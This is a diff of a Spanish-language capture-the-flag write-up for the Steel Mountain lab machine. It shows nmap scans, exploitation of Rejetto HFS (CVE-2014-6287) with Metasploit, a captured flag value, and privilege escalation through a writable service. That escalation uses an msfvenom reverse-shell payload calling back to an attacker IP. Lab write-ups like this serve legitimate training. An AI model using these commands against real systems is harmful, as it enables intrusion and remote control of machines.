@@ -2,30 +2,33 @@ Hola, esté es mi Write up de la Maquina Steel Mountain
 
 Bueno Obviamente lo primero que realicé fue un Scan
 sudo nmap sudo nmap -p- -sV -T4 -A 10.10.13.172 -vvv
-En realidad hice 2 el otro fue
-sudo nmap 10.10.13.172 -vvv 
+Steel Mountain Machine Write-Up
 
-En el puerto 80 se encuentra una página web
-En la cual por ahora pude obtener el nombre y apellido de un empleado
+Para comenzar con mi análisis de la máquina Steel Mountain, realicé un escaneo de puertos utilizando la herramienta Nmap:
+//
+sudo nmap -p- -sV -T4 -A 10.10.13.172 -vvv
+//
+Además, realicé un segundo escaneo más básico con el siguiente comando:
+//
+sudo nmap 10.10.13.172 -vvv
+//
+Descubrí que en el puerto 80 se encuentra una página web, a través de la cual pude obtener el nombre y apellido de un empleado. También encontré una página en el puerto 8080, la cual reveló un servidor vulnerable.
 
-Luego en el puerto 8080 tambien se encuentra una página la cual me dio un servidor con el cual puedo vulnerar
+Identifiqué que el servidor de archivos tiene una vulnerabilidad conocida como CVE-2014-6287. Utilicé Metasploit para buscar un exploit relacionado con esta vulnerabilidad. Después de ejecutar el comando search 2014-6287, encontré el exploit windows/http/rejetto_hfs_exec, el cual utilicé para obtener acceso a la máquina.
 
-El numero CVE para vulnerar el servidor de archivos es 2014-6287
-Entré a Metasploit hice search 2014-6287
-Encontré exploit(windows/http/rejetto_hfs_exec)
-Así que usé ese exploit y obtuve acceso a la maquina
-Cuando gane acceso fui directo a conseguir la primera FLag que se encontraba en el Desktop del User Bill 
-Esta es la flag b04763b6fcf51fcd7c13abc7db4fd365
+Una vez que obtuve acceso, mi primera tarea fue encontrar la primera flag, la cual se encontraba en el escritorio del usuario Bill. La flag es: b04763b6fcf51fcd7c13abc7db4fd365.
 
-Ahora Directo a escalar privilegios.
-Acá usé un script de PowerShell llamado PowerUp , cuyo propósito es evaluar una máquina con Windows y determinar cualquier anomalía:  " PowerUp pretende ser un centro de intercambio de información sobre los vectores comunes de escalada de privilegios de Windows  que dependen de configuraciones incorrectas " .
+A continuación, procedí a escalar privilegios. Utilicé un script de PowerShell llamado PowerUp, diseñado para evaluar máquinas con Windows y detectar posibles anomalías relacionadas con la escalada de privilegios. PowerUp proporciona información sobre vectores comunes de escalada de privilegios en Windows que pueden depender de configuraciones incorrectas.
 
-Me encontré un servicio con una vulnerabilidad AdvancedSystemCareService9
+Durante mi análisis, identifiqué un servicio vulnerable llamado AdvancedSystemCareService9. La opción CanRestart estaba configurada como verdadera, lo que me permitió reiniciar el servicio en el sistema. Además, el directorio de la aplicación era escribible, lo que significaba que podía reemplazar la aplicación legítima por una maliciosa y luego reiniciar el servicio para ejecutar mi programa infectado.
 
-La opción CanRestart es verdadera, nos permite reiniciar un servicio en el sistema, el directorio de la aplicación también se puede escribir. Esto significa que podemos reemplazar la aplicación legítima por una maliciosa y reiniciar el servicio, que ejecutará nuestro programa infectado.
+Para aprovechar esta vulnerabilidad, utilicé msfvenom para generar un payload malicioso. El comando utilizado fue:
+//
+msfvenom -p windows/shell_reverse_tcp LHOST=10.8.56.237 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+//
+Posteriormente, subí mi binario malicioso y lo reemplacé por el archivo anteriormente mencionado.
+Luego, utilicé el comando sc stop para detener el servicio AdvancedSystemCareService9. Una vez detenido, reemplacé el archivo con mi versión maliciosa y reinicié el servicio. Esto me permitió obtener una shell inversa en la máquina objetivo.
 
-Utilicé msfvenom -p windows/shell_reverse_tcp LHOST=10.8.56.237 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
-
-Subí mi binario y remplacé el anterior.
+Con la shell inversa, ejecuté algunos comandos para escalar mis privilegios y finalmente obtuve acceso de root. Desde la sesión de root, pude capturar la flag final y completar el desafío de la máquina Steel Mountain.
 
 
